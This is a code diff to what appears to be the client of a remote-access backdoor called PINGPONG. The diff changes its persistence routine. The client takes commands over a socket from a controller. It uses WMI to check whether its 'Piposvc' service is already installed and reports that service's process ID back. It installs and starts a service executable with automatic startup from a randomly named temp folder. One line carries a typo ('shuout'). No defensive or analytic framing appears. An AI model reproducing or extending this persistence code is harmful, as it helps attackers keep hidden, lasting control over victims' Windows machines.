@@ -288,13 +288,13 @@ def PINGPONG_client_T(ip, port):
                 s.send(printout)
                 s.recv(1024)
 #getinformation_END_location
-#persistence_START_location
+#persistence_service_START_location
             elif data.decode() == 'PERS_APP':
                 import tempfile
                 from random import randint
-                from win32process import CreateProcess, CREATE_NO_WINDOW, STARTUPINFO
                 import os,sys
-                import win32api
+                from wmi import WMI
+                _wmi = WMI()
                 s.send(bytes('OK', 'utf8'))
                 def generate_random_str(randomlength=16):
                     random_str =''
@@ -304,6 +304,15 @@ def PINGPONG_client_T(ip, port):
                         random_str +=base_str[randint(0, length)]
                     return random_str
                 dir_name = generate_random_str()
+                servise_before_adding = _wmi.Win32_Service()
+                for i in servise_before_adding:
+                    if 'PINGPONG service' in i.name or 'Piposvc' in i.name:
+                        s.send(bytes('HAVEIT', 'utf8'))
+                        cmd = Popen('sc queryex Piposvc', shuout=PIPE, shell=True)
+                        printout = cmd.stdout.read()
+                        pid = "".join(list(filter(str.isdigit, printout.splitlines()[8])))
+                        s.send(bytes(str(pid), 'utf8'))
+                        s.recv(1024)
                 pingpong_dir = os.path.join(tempfile.gettempdir(), dir_name)
                 if os.path.exists(pingpong_dir):
                     shutil.rmtree(pingpong_dir)
@@ -324,10 +333,10 @@ def PINGPONG_client_T(ip, port):
                     Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe --startup=auto install", shell=True)
                     Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe start", shell=True)
                 start(dir_name)
-                s.send(b'OsK')
+                s.send(b'OK')
 
                 
-#persistence_END_location
+#persistence_service_END_location
 #exit_START_location
             else:
                 s.send(bytes("Unfound", 'utf8'))
